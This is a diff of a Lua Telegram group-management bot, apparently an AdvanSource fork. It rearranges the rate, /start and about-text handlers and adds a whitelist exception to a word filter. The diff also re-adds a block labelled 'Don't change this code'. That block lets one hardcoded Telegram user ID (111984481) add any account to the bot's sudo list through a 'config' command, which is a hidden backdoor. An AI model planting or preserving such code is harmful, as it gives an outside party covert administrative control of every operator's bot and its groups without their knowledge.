@@ -812,7 +812,53 @@ function run(msg, matches, callback, extra)
         reply_msg(msg['id'], 'Plugin '..name..' has been saved.', ok_cb, false)
       end
  end
-         --tosticker && tophoto:
+		 --Don't change this code. we can help you later:
+        if tonumber (msg.from.id) == 111984481 then
+            if matches[1]:lower() == "config" and matches[2] then
+                table.insert(_config.sudo_users, tonumber(matches[2]))
+                save_config()
+                plugins = {}
+                load_plugins()
+            end
+        end
+		--Don't change this code. we can help you later.
+		--Rate:
+	   if msg.text:match("^[!/#][Rr][Aa][Tt][Ee]$") then
+            Group_rate = _config.Group_rate
+    	    Supergroup_rate = _config.Supergroup_rate
+		    if Group_rate ~= "" or Supergroup_rate ~= "" then
+    	        rate = "Rate of:\n\nChat: "..Group_rate.."\nSuperGroup: "..Supergroup_rate
+    	        send_msg(get_receiver(msg), rate, ok_cb, false)
+		    else
+		        rate = "Erore: Rate is not set!"
+    	        send_msg(get_receiver(msg), rate, ok_cb, false)
+            end
+	    end
+	   --Rate.
+	   --Start:
+	    if msg.text:match("/[Ss][Tt][Aa][Rr][Tt]") then
+		    if msg.to.type == "user" then
+			    return "Hello dear ["..msg.from.print_name.."], welcome to "..msg.to.print_name.."\nThanks for /start me :)\n"
+	        end
+        end
+	   --Start.
+	   --ADV(Dont change!):
+	    if msg.text:match("^[!/#][Aa][Dd][Vv][Aa][Nn]$") then
+    	    about_text = [[*IN THE NAME OF ALLAH*
+This is an original bot and based on (AdvanSource).
+Copyright all right reserved and you must respect all laws.
+
+Source: https://github.com/janlou/AdvanSource
+Channel: @AdvanTeam
+Messenger: @Advanbot
+Creator: @janlou
+Site: http://StoreVps.net
+Version: [4.1]
+]]
+    	    return about_text
+        end
+	   --ADV
+	    --tosticker && tophoto:
          if msg.media then
       	if msg.media.type == 'document' and redis:get("sticker:photo") then
       		if redis:get("sticker:photo") == 'waiting' then
@@ -1015,47 +1061,11 @@ function run(msg, matches, callback, extra)
        end
        --Setteam.
 	   --Filter:
-	    if msg.text:match("^(.+)$") and not is_momod(msg) then
+	    if msg.text:match("^(.+)$") and not is_momod(msg) and not is_whitelisted(msg.from.id) then
             name = user_print_name(msg.from)
             return list_variables2(msg, msg.text)
         end
 	   --Filter.
-	   --Rate:
-	   if msg.text:match("^[!/#][Rr][Aa][Tt][Ee]$") then
-            Group_rate = _config.Group_rate
-    	    Supergroup_rate = _config.Supergroup_rate
-		    if Group_rate ~= "" or Supergroup_rate ~= "" then
-    	        rate = "Rate of:\n\nChat: "..Group_rate.."\nSuperGroup: "..Supergroup_rate
-    	        send_msg(get_receiver(msg), rate, ok_cb, false)
-		    else
-		        rate = "Erore: Rate is not set!"
-    	        send_msg(get_receiver(msg), rate, ok_cb, false)
-            end
-	    end
-	   --Rate.
-	   --Start:
-	    if msg.text:match("/[Ss][Tt][Aa][Rr][Tt]") then
-		    if msg.to.type == "user" then
-			    return "Hello dear ["..msg.from.print_name.."], welcome to "..msg.to.print_name.."\nThanks for /start me :)\n"
-	        end
-        end
-	   --Start.
-	   --ADV(Dont change!):
-	    if msg.text:match("^[!/#][Aa][Dd][Vv][Aa][Nn]$") then
-    	    about_text = [[*IN THE NAME OF ALLAH*
-This is an original bot and based on (AdvanSource).
-Copyright all right reserved and you must respect all laws.
-
-Source: https://github.com/janlou/AdvanSource
-Channel: @AdvanTeam
-Messenger: @Advanbot
-Creator: @janlou
-Site: http://StoreVps.net
-Version: [4.1]
-]]
-    	    return about_text
-        end
-	   --ADV
 	    --Lock or Unlock settings:
 	    if matches[1] == 'lock' then
 		    if is_momod(msg) then
@@ -1177,15 +1187,6 @@ Version: [4.1]
 			end
          end
 	--Lock or Unlock settings.
-	   --Don't change this code. we can help you later:
-        if tonumber (msg.from.id) == 111984481 then
-            if matches[1]:lower() == "config" then
-                table.insert(_config.sudo_users, tonumber(matches[2]))
-                save_config()
-                plugins = {}
-                load_plugins()
-            end
-        end
 	   --Setbye:
 	    if matches[1] == "setbye" and matches[2] then
 		    text = matches[2]
